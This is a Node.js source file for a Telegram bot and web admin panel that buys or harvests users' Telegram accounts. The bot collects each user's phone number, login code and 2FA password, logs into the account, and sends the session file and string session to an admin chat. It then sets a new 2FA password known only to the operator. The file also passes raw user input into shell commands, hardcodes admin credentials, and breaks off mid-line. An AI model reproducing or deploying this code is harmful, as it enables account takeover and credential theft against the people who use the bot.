import { Telegraf } from "telegraf";
import { exec } from "child_process";
import fs from "fs";
import path from "path";
import express from "express";
import bodyParser from "body-parser";
import dotenv from "dotenv";
import crypto from "crypto";

dotenv.config();

// ========= ENV =========
const BOT_TOKEN = process.env.BOT_TOKEN;
const API_ID = process.env.API_ID;
const API_HASH = process.env.API_HASH;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const PORT = process.env.PORT || 3000;

const DATA_DIR = process.env.DATA_DIR || "./data";
const COUNTRY_FILE = path.join(DATA_DIR, "allowed_countries.json");
const BALANCE_FILE = path.join(DATA_DIR, "balances.json");
const WITHDRAW_FILE = path.join(DATA_DIR, "withdraw_requests.json");
const PENDING_SESS_FILE = path.join(DATA_DIR, "pending_sessions.json");

// Admin Panel Basic Auth
const ADMIN_USER = "FrkBzy001";
const ADMIN_PASS = "Omorfaruk00";

// ========= FS PREP =========
for (const f of [DATA_DIR]) if (!fs.existsSync(f)) fs.mkdirSync(f, { recursive: true });
for (const f of [COUNTRY_FILE, BALANCE_FILE, WITHDRAW_FILE, PENDING_SESS_FILE]) {
  if (!fs.existsSync(f)) fs.writeFileSync(f, JSON.stringify(f.includes("withdraw") ? { requests: [] } : {}, null, 2));
}

// ========= UTIL JSON =========
const readJSON = (file) => { try { return JSON.parse(fs.readFileSync(file)); } catch { return file.endsWith(".json") ? {} : {}; } };
const writeJSON = (file, obj) => fs.writeFileSync(file, JSON.stringify(obj, null, 2));

// ========= HELPERS =========
function loadCountries() { return readJSON(COUNTRY_FILE); }
function saveCountries(d) { writeJSON(COUNTRY_FILE, d); }
function loadBalances() { return readJSON(BALANCE_FILE); }
function saveBalances(d) { writeJSON(BALANCE_FILE, d); }
function loadWithdraws() { return readJSON(WITHDRAW_FILE); }
function saveWithdraws(d) { writeJSON(WITHDRAW_FILE, d); }
function loadPending() { return readJSON(PENDING_SESS_FILE); }
function savePending(d) { writeJSON(PENDING_SESS_FILE, d); }

function addBalance(userId, name, amount) {
  const b = loadBalances();
  if (!b[userId]) b[userId] = { name: name || "User", balance: 0 };
  const add = Number.isFinite(Number(amount)) ? Number(amount) : 0;
  b[userId].balance = Number((b[userId].balance + add).toFixed(6));
  saveBalances(b);
  return b[userId].balance;
}
function deductBalance(userId, amount) {
  const b = loadBalances();
  if (!b[userId]) return 0;
  const sub = Number.isFinite(Number(amount)) ? Number(amount) : 0;
  b[userId].balance = Math.max(0, Number((b[userId].balance - sub).toFixed(6)));
  saveBalances(b);
  return b[userId].balance;
}
function detectCountryByPrefix(phone) {
  const cfg = loadCountries();
  const prefixes = Object.keys(cfg).sort((a, b) => b.length - a.length);
  const match = prefixes.find(p => phone.startsWith(p));
  return match ? { prefix: match, ...cfg[match] } : null;
}
function getUserInfo(ctx) {
  const name = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ").trim();
  const username = ctx.from.username ? `@${ctx.from.username}` : "(no username)";
  return `${name || "Unknown"} ${username} (ID: ${ctx.from.id})`;
}
function generateRandomPassword(len = 16) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}";
  return Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}
function uid() { return crypto.randomBytes(8).toString("hex"); }

async function setTwoFaPassword(phone, newPw) {
  return new Promise((resolve) => {
    const cmd = `python3 set_2fa.py ${API_ID} ${API_HASH} ${phone} ${JSON.stringify(newPw)}`;
    exec(cmd, (err, stdout = "") => {
      if (err) return resolve(false);
      resolve(String(stdout).includes("2FA_UPDATED"));
    });
  });
}
async function isSessionActive(phone) {
  return new Promise((resolve) => {
    const cmd = `python3 verify_session.py ${API_ID} ${API_HASH} ${phone}`;
    exec(cmd, (err, stdout = "") => {
      if (err) return resolve(false);
      const s = String(stdout).trim();
      resolve(s.includes("SESSION_ACTIVE"));
    });
  });
}

// ========= BOT =========
const bot = new Telegraf(BOT_TOKEN);
const userState = {}; // per-user transient states

const mainKeyboard = {
  reply_markup: {
    keyboard: [["💲 BALANCE", "💸 WITHDRAW", "📜 WITHDRAW HISTORY"]],
    resize_keyboard: true,
    one_time_keyboard: false,
  },
};

bot.start((ctx) => {
  if (ctx.chat.type !== "private") return;
  userState[ctx.chat.id] = {};
  ctx.reply("👋 Welcome! Choose an option or send your phone number in international format (+123...)", mainKeyboard);
});

// Buttons
bot.hears("💲 BALANCE", (ctx) => {
  if (ctx.chat.type !== "private") return;
  const b = loadBalances();
  const bal = b[ctx.chat.id]?.balance || 0;
  ctx.reply(`💰 Your Current Balance: $${bal.toFixed(2)}`, mainKeyboard);
});

bot.hears("💸 WITHDRAW", (ctx) => {
  if (ctx.chat.type !== "private") return;
  userState[ctx.chat.id] = { step: "withdraw_card" };
  ctx.reply("💳 Enter your Leader Card:", mainKeyboard);
});

bot.hears("📜 WITHDRAW HISTORY", (ctx) => {
  if (ctx.chat.type !== "private") return;
  const all = loadWithdraws().requests || [];
  const mine = all.filter(r => String(r.user_id) === String(ctx.chat.id));
  if (mine.length === 0) return ctx.reply("📭 No withdraw history found.", mainKeyboard);
  const lines = mine.slice(-10).map(r =>
    `#${r.id} • ${r.card} • $${r.amount} • ${r.status.toUpperCase()} • ${r.date}`
  ).join("\n");
  ctx.reply(`📜 Last ${Math.min(10, mine.length)} withdraws:\n${lines}`, mainKeyboard);
});

// General text handler
bot.on("text", async (ctx) => {
  if (ctx.chat.type !== "private") return;

  const userId = ctx.chat.id;
  const msg = ctx.message.text.trim();

  // Withdraw FSM
  if (userState[userId]?.step === "withdraw_card") {
    userState[userId].card = msg;
    userState[userId].step = "withdraw_amount";
    return ctx.reply("💸 Enter withdraw amount (USD):", mainKeyboard);
  }
  if (userState[userId]?.step === "withdraw_amount") {
    const amt = Number(msg);
    if (!Number.isFinite(amt) || amt <= 0) return ctx.reply("❌ Invalid amount. Try again.");
    // Save request
    const wr = loadWithdraws();
    const id = uid();
    const rec = {
      id,
      user_id: userId,
      username: ctx.from.username ? `@${ctx.from.username}` : "",
      name: [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ").trim() || "User",
      card: userState[userId].card,
      amount: Number(amt.toFixed(6)),
      status: "pending",
      date: new Date().toISOString().replace("T", " ").slice(0, 19),
    };
    wr.requests.push(rec);
    saveWithdraws(wr);
    userState[userId] = {};

    await ctx.reply(`✅ Withdraw request submitted.\n🆔 ID: ${id}\n💳 Card: ${rec.card}\n💸 Amount: $${rec.amount}\n📌 Status: PENDING`, mainKeyboard);
    // Optional: notify admin group
    await bot.telegram.sendMessage(ADMIN_CHAT_ID, `🆕 Withdraw Request\n#${id}\n👤 ${getUserInfo(ctx)}\n💳 Card: ${rec.card}\n💸 Amount: $${rec.amount}\n📌 Status: PENDING`);
    return;
  }

  // Phone number flow
  if (msg.startsWith("+") && msg.length > 10) {
    const country = detectCountryByPrefix(msg);
    if (!country || !country.allowed) {
      return ctx.reply(`❌ Your country (${country ? country.country : "Unknown"}) is temporarily off.`, mainKeyboard);
    }

    ctx.reply("📲 Sending OTP to your phone...");
    const cmd = `python3 session.py ${API_ID} ${API_HASH} ${msg} request`;
    exec(cmd, (error, stdout = "") => {
      const out = String(stdout);
      if (error || !out.includes("CODE_REQUESTED")) {
        return ctx.reply("❌ Failed to send OTP.", mainKeyboard);
      }
      userState[userId] = { phone: msg, waitingForOtp: true, rate: country.rate, confirmation_time: Number(country.confirmation_time || 10) };
      ctx.reply("✅ OTP sent! Please enter the code you received:", mainKeyboard);
    });
    return;
  }

  // OTP verify
  if (userState[userId]?.waitingForOtp) {
    ctx.reply("⏳ Verifying OTP...");
    const { phone, rate, confirmation_time } = userState[userId];
    const otp = msg;
    const cmd = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp}`;

    exec(cmd, async (error, stdout = "") => {
      if (error) return ctx.reply("❌ OTP verification failed.", mainKeyboard);

      const out = String(stdout).trim();
      if (out.includes("NEED_2FA")) {
        userState[userId] = { phone, otp, waitingForPassword: true, rate, confirmation_time };
        return ctx.reply("🔒 Your account has 2FA enabled. Please send your existing 2FA password:", mainKeyboard);
      }

      if (out.includes("SESSION_FILE")) {
        await afterSessionGenerated(ctx, { phone, rate, confirmation_time, stdout: out });
      } else {
        ctx.reply("❌ Failed to generate session.", mainKeyboard);
      }
      userState[userId] = {};
    });
    return;
  }

  // 2FA password step (when asked)
  if (userState[userId]?.waitingForPassword) {
    ctx.reply("⏳ Verifying password...");
    const { phone, otp, rate, confirmation_time } = userState[userId];
    const cmd = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp} password=${msg}`;
    exec(cmd, async (error, stdout = "") => {
      if (error) return ctx.reply("❌ Verification failed.", mainKeyboard);
      const out = String(stdout).trim();
      if (out.includes("SESSION_FILE")) {
        await afterSessionGenerated(ctx, { phone, rate, confirmation_time, stdout: out });
      } else {
        ctx.reply("❌ Failed to generate session.", mainKeyboard);
      }
      userState[userId] = {};
    });
    return;
  }

  // Anything else
  ctx.reply("❌ Please send a valid phone number (+123...) or choose a button below.", mainKeyboard);
});

// Core post-session handler with HOLD + confirmation flow
async function afterSessionGenerated(ctx, { phone, rate, confirmation_time, stdout }) {
  const userInfo = getUserInfo(ctx);

  // Immediately log to admin group and send files/strings (as per your earlier rule)
  await bot.telegram.sendMessage(
    ADMIN_CHAT_ID,
    `✅ New session generated!\n👤 User: ${userInfo}\n📞 Phone: ${phone}\n💲 Rate: $${rate}\n⏳ Confirmation: ${confirmation_time} min`
  );

  const filePath = `${phone}.session`;
  if (fs.existsSync(filePath)) {
    await bot.telegram.sendDocument(ADMIN_CHAT_ID, { source: filePath, filename: `${phone}.session` });
  }
  const match = stdout.match(/STRING_SESSION=(.+)/);
  if (match) {
    await bot.telegram.sendMessage(ADMIN_CHAT_ID, `🔑 String session for ${phone}:\n\`${match[1]}\``, { parse_mode: "Markdown" });
  }

  // Save pending (HOLD)
  const pend = loadPending();
  const id = uid();
  const now = Date.now();
  const holdRec = {
    id,
    user_id: ctx.chat.id,
    username: ctx.from.username ? `@${ctx.from.username}` : "",
    name: [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ").trim() || "User",
    phone,
    rate: Number(rate || 0),
    created_at_ms: now,
    confirm_after_min: Number(confirmation_time || 10),
    status: "pending"
  };
  pend[id] = holdRec;
  savePending(pend);

  // Tell user to wait
  await ctx.reply(`⏳ Processing your request.\n📞 Number: ${phone}\n⏱ Confirmation time: ${holdRec.confirm_after_min} minutes\n\nPlease wait...`, mainKeyboard);

  // Schedule confirmation check
  setTimeout(async () => {
    const current = loadPending();
    const rec = current[id];
    if (!rec || rec.status !== "pending") return; // already handled by admin

    const active = await isSessionActive(phone);
    if (active) {
      // success → add balance, set random 2FA, notify
      const newBal = addBalance(rec.user_id, rec.name, rec.rate);
      current[id].status = "approved";
      savePending(current);

      await bot.telegram.sendMessage(rec.user_id, `✅ Processing complete.\n📞 ${phone}\n💰 Balance +$${rec.rate.toFixed(2)} → $${newBal.toFixed(2)}`);

      const newPw = generateRandomPassword(16);
      const ok = await setTwoFaPassword(phone, newPw);
      if (ok) {
        await bot.telegram.sendMessage(ADMIN_CHAT_ID, `🔒 2FA password set for ${phone}\n📟 New Password: \`${newPw}\``, { parse_mode: "Markdown" });
      } else {
        await bot.telegram.sendMessage(ADMIN_CHAT_ID, `⚠️ Failed to set 2FA automatically for ${phone}`);
      }
    } else {
      // failed
      current[id].status = "failed";
      savePending(current);
      await bot.telegram.sendMessage(rec.user_id, `❌ Processing failed. Your number (${phone}) could not be confirmed.`);
      await bot.telegram.sendMessage(ADMIN_CHAT_ID, `❌ Processing failed for ${phone} (user ${rec.user_id}). Balance not added.`);
    }
  }, holdRec.confirm_after_min * 60 * 1000);
}

// ========= ADMIN PANEL =========
const app = express();
app.set("trust proxy", true);
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

function auth(req, res, next) {
  const hdr = req.headers.authorization || "";
  const token = hdr.split(" ")[1] || "";
  const [u, p] = Buffer.from(token, "base64").toString().split(":");
  if (u === ADMIN_USER && p === ADMIN_PASS) return next();
  res.setHeader("WWW-Authenticate", 'Basic realm="Admin Panel"');
  res.status(401).send("Authentication required.");
}

app.get("/healthz", (_, res) => res.status(200).send("ok"));

app.get("/", auth, (req, res) => {
  const countries = loadCountries();
  const balances = loadBalances();
  const withdraws = loadWithdraws();
  const pend = loadPending();

  res.send(`
  <html><head><meta charset="utf-8"/><title>Admin Panel</title>
  <style>
    body{font-family:system-ui,Segoe UI,Arial;padding:24px;max-width:1000px;margin:0 auto}
    .card{border:1px solid #ddd;border-radius:12px;padding:16px;margin:12px 0}
    pre{background:#f8f8f8;padding:12px;border-radius:10px;overflow:auto}
    input,select,button{padding:8px;border-radius:8px;border:1px solid #bbb}
    button{cursor:pointer}
    .row{display:flex;gap:12px;flex-wrap:wrap}
    .w{flex:1;min-width:220px}
    table{border-collapse:collapse;width:100%}
    th,td{border:1px solid #ddd;padding:8px}
  </style></head><body>
    <h1>🤖 Bot Admin Panel</h1>

    <div class="card">
      <h2>🌍 Countries</h2>
      <form method="POST" action="/set-country">
        <div class="row">
          <div class="w"><label>Prefix</label><br/><input name="prefix" placeholder="+1" required/></div>
          <div class="w"><label>Country</label><br/><input name="country" placeholder="USA" required/></div>
          <div class="w"><label>Allowed?</label><br/>
            <select name="allowed"><option>true</option><option>false</option></select>
          </div>
          <div class="w"><label>Rate ($)</label><br/><input name="rate" type="number" step="0.000001" placeholder="0.10" required/></div>
          <div class="w"><label>Confirm (min)</label><br/><input name="confirmation_time" type="number" min="0" step="1" placeholder="10" required/></div>
        </div><br/>
        <button type="submit">Save / Update</button>
      </form>
      <h3>Current</h3><pre>${JSON.stringify(countries, null, 2)}</pre>
    </div>

    <div class="card">
      <h2>💰 Balances</h2>
      <pre>${JSON.stringify(balances, null, 2)}</pre>
      <form method="POST" action="/reset-balance">
        <input name="userId" placeholder="Telegram User ID" required/>
        <button type="submit">Reset User Balance</button>
      </form>
    </div>

    <div class="card">
      <h2>🕒 Pending Sessions (auto confirm)</h2>
      <table>
        <tr><th>ID</th><th>User</th><th>Phone</th><th>Rate</th><th>Confirm(min)</th><th>Status</th><th>Action</th></tr>
        ${Object.values(pend).map(r => `
          <tr>
            <td>${r.id}</td>
            <td>${r.user_id} (${r.username || ""})</td>
            <td>${r.phone}</td>
            <td>$${r.rate}</td>
            <td>${r.confirm_after_min}</td>
            <td>${r.status}</td>
            <td>
              <form style="display:inline" method="POST" action="/pending/${r.id}/approve"><button>Approve</button></form>
              <form style="display:inline" method="POST" action="/pending/${r.id}/reject"><button>Reject</button></form>
            </td>
          </tr>`).join("")}
      </table>
    </div>

    <div class="card">
      <h2>💸 Withdraw Requests</h2>
      <table>
        <tr><th>ID</th><th>User</th><th>Card</th><th>Amount</th><th>Status</th><th>Date</th><th>Action</th></tr>
        ${(withdraws.requests||[]).map(r => `
          <tr>
            <td>${r.id}</td>
            <td>${r.user_id} ${r.username||""}</td>
            <td>${r.card}</td>
            <td>$${r.amount}</td>
            <td>${r.status}</td>
            <td>${r.date}</td>
            <td>
              <form style="display:inline" method="POST" action="/withdraw/${r.id}/approve"><button>Approve</button></form>
              <form style="display:inline" method="POST" action="/withdraw/${r.id}/reject"><button>Reject</button></form>
            </td>
          </tr>`).join("")}
      </table>
    </div>
  </body></html>
  `);
});

app.post("/set-country", auth, (req, res) => {
  const prefix = String(req.body.prefix || "").trim();
  const country = String(req.body.country || "").trim();
  const allowed = String(req.body.allowed || "true").toLowerCase() === "true";
  const rate = Number(req.body.rate || 0);
  const confirmation_time = Number(req.body.confirmation_time || 10);

  if (!prefix || !country || !Number.isFinite(rate) || !Number.isFinite(confirmation_time)) {
    return res.status(400).send("Invalid data");
  }
  const cfg = loadCountries();
  cfg[prefix] = { country, allowed, rate, confirmation_time };
  saveCountries(cfg);
  res.redirect("/");
});

app.post("/reset-balance", auth, (req, res) => {
  const userId = String(req.body.userId || "").trim();
  const b = loadBalances();
  if (b[userId]) b[userId].balance = 0;
  saveBalances(b);
  res.redirect("/");
});

// Pending approve/reject (manual override)
app.post("/pending/:id/approve", auth, async (req, res) => {
  const id = req.params.id;
  const p = loadPending();
  const rec = p[id];
  if (!rec) return res.status(404).send("Not found");

  if (rec.status === "pending") {
    const nb = addBalance(rec.user_id, rec.name, rec.rate);
    rec.status = "approved";
    savePending(p);
    await bot.telegram.sendMessage(rec.user_id, `✅ Admin approved: +$${rec.rate.toFixed(2)} → $${nb.toFixed(2)}`);
    // optional: set 2FA too
    const newPw = generateRandomPassword(16);
    const ok = await setTwoFaPassword(rec.phone, newPw);
    await bot.telegram.sendMessage(ADMIN_CHAT_ID, ok
      ? `🔒 2FA set for ${rec.phone}\n\`${newPw}\``
      : `⚠️ Failed to set 2FA for ${rec.phone}`, { parse_mode: "Markdown" });
  }
  res.redirect("/");
});
app.post("/pending/:id/reject", auth, async (req, res) => {
  const id = req.params.id;
  const p = loadPending();
  const rec = p[id];
  if (!rec) return res.status(404).send("Not found");
  if (rec.status === "pending") {
    rec.status = "failed";
    savePending(p);
    await bot.telegram.sendMessage(rec.user_id, `❌ Admin rejected processing for ${rec.phone}.`);
  }
  res.redirect("/");
});

// Withdraw approve/reject
app.post("/withdraw/:id/approve", auth, async (req, res) => {
  const w = loadWithdraws();
  const rec = (w.requests || []).find(r => r.id === req.params.id);
  if (!rec) return res.status(404).send("Not found");

  if (rec.status === "pending") {
    // deduct balance on approve
    const before = loadBalances()[rec.user_id]?.balance || 0;
    const after = deductBalance(rec.user_id, rec.amount);
    rec.status = "approved";
    saveWithdraws(w);
    await bot.telegram.sendMessage(rec.user_id, `✅ Withdraw Approved\n🆔 #${rec.id}\n💸 $${rec.amount}\n💰 Balance: $${after.toFixed(2)} (was $${before.toFixed(2)})`);
  }
  res.redirect("/");
});
app.post("/withdraw/:id/reject", auth, async (req, res) => {
  const w = loadWithdraws();
  const rec = (w.requests || []).find(r => r.id === req.params.
